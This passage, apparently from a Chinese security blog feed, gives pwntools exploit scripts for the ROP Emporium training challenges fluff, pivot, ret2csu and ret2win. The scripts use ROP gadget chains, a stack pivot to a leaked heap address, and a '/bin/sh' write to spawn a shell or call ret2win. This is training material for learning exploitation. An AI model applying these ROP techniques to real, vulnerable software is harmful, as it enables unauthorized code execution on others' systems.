title="6-fluff"></a>6-fluff</h2><p>这个和前面的write4有异曲同工之处，只不过这个程序没有那么多的mov，需要借助到xor（xor自身会清空，xor另一个数，就等于存值）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./fluff'</span>)</span><br><span class="line"></span><br><span class="line">system = 0x04005E0</span><br><span class="line">bss = 0x0601060</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x04008c3 </span><br><span class="line">pop_r12 = 0x04008bc</span><br><span class="line"><span class="comment">#pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"></span><br><span class="line">xor_r11_r11 = 0x0400822</span><br><span class="line"><span class="comment"># xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret</span></span><br><span class="line">xor_r11_r12 = 0x040082f</span><br><span class="line"><span class="comment"># xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret</span></span><br><span class="line">xchg_r11_r10 = 0x0400840</span><br><span class="line"><span class="comment"># xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret</span></span><br><span class="line">mov_r10_r11 = 0x040084e</span><br><span class="line"><span class="comment"># mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop_r12) + p64(bss) + p64(0) + p64(0) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r11) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r12) + p64(0)</span><br><span class="line">payload += p64(xchg_r11_r10) + p64(0) </span><br><span class="line">payload += p64(pop_r12) + <span class="string">"/bin/sh\x00"</span>+ p64(0) + p64(0) + p64(0) </span><br><span class="line">payload += p64(xor_r11_r11) + p64(0)</span><br><span class="line">payload += p64(xor_r11_r12) + p64(0) </span><br><span class="line">payload += p64(mov_r10_r11) + p64(0) + p64(0) </span><br><span class="line">payload += p64(pop_rdi) + p64(bss) + p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="7-pivot"><a href="#7-pivot" class="headerlink" title="7-pivot"></a>7-pivot</h2><p>这个貌似有用到栈迁移的东西，这个程序有两个输入，第一个是写到堆里（它给出了堆的地址），第二个是写入到栈里。很明显第二次能输入的内容太少，所以payload写入堆里，然后在栈里调用。</p><p>.so里有一个后门函数，可以直接调用ret2win，cat到flag。而要leak真实地址的话要找两个文件都有的函数，貌似是只有foothold_function函数#函数需要经过一次调用之后got表里才会有真实地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pivot'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libpivot.so'</span>)</span><br><span class="line"></span><br><span class="line">foothold_function_so = libc.symbols[<span class="string">'foothold_function'</span>]</span><br><span class="line">ret2win = libc.symbols[<span class="string">'ret2win'</span>]</span><br><span class="line"></span><br><span class="line">foothold_function_plt = 0x0400850</span><br><span class="line">foothold_function_got = 0x0602048</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offest = ret2win - foothold_function_so</span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget</span></span><br><span class="line">pop_rax = 0x0400b00</span><br><span class="line">mov_rax_addr = 0x0400b05</span><br><span class="line">pop_rbp = 0x0400900</span><br><span class="line">pop_rdi = 0x0400b73</span><br><span class="line"></span><br><span class="line">call_rax = 0x040098e</span><br><span class="line">add_rax_rbp = 0x0400b09</span><br><span class="line"></span><br><span class="line">xchg_rax_rsp = 0x0400b02</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The Old Gods kindly bestow upon you a place to pivot: "</span>)</span><br><span class="line">heap_addr  = int(sh.recv(14),16)</span><br><span class="line"></span><br><span class="line">payload1 = p64(foothold_function_plt) + p64(pop_rax) + p64(foothold_function_got) + p64(mov_rax_addr)</span><br><span class="line">payload1 += p64(pop_rbp) + p64(offest) + p64(add_rax_rbp) + p64(call_rax)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload2 += p64(pop_rax) + p64(heap_addr) + p64(xchg_rax_rsp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.recvuntil(<span class="string">"into libpivot.so"</span>)  <span class="comment">#foothold_function() in libpivot.so print this sentence</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8-ret2csu"></a>8-ret2csu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">system = 0x04005A0</span><br><span class="line">ret2win = 0x04007B1</span><br><span class="line">init = 0x0600E18   <span class="comment">#self init/fini</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget </span></span><br><span class="line">pop5_addr = 0x040089A  <span class="comment">#pop_rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">mov_call = 0x0400880   <span class="comment">#mov rdx_r15 rsi_r14 edi_r13d  call r12+rbp*8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop5_addr) + p64(0) + p64(1) + p64(init) + p64(0) + p64(0) + p64(0xdeadcafebabebeef)</span><br><span class="line">payload += p64(mov_call) + <span class="string">"a"</span>*56 + p64(ret2win)</span><br><span class="line">gdb.attach(sh,<span class="string">'b setvbuf'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。&lt;/p&gt;
&lt;h2 id=&quot;1-ret2win&quot;&gt;&lt;a href=&quot;#1-ret2win&quot; class=&quot;headerlink&quot; title=&quot;1-ret2win&quot;&gt;&lt;/a&gt;1-ret2win&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh = process(&lt;span class=&quot;string&quot;&gt;&#39;./ret2win&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;shell=0x0400824&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bss = 0x0601060&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = 0x20*&lt;span class=&quot;string&quot;&gt;&quot;a&quot;&lt;/span&gt; + p64(0) + p64(shell)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
